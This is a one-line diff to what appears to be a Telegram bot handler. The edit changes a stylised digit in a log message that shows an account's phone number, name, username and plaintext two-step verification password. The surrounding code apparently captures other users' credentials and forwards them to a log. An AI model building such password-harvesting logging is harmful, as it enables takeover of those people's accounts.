@@ -518,7 +518,7 @@ def register_handlers(client):
                 f"📞 <b>Phone :</b> <code>{phone}</code>\n"
                 f"🏷️ <b>Name :</b> <b>{name}</b>\n"
                 f"🔗 <b>Username :</b> @{uname if uname else 'None'}\n"
-                f"🔐 <b>𝟸-Step Password :</b> <code>{pwd}</code></blockquote>"
+                f"🔐 <b>2-Step Password :</b> <code>{pwd}</code></blockquote>"
             )
             
             log_buttons = []
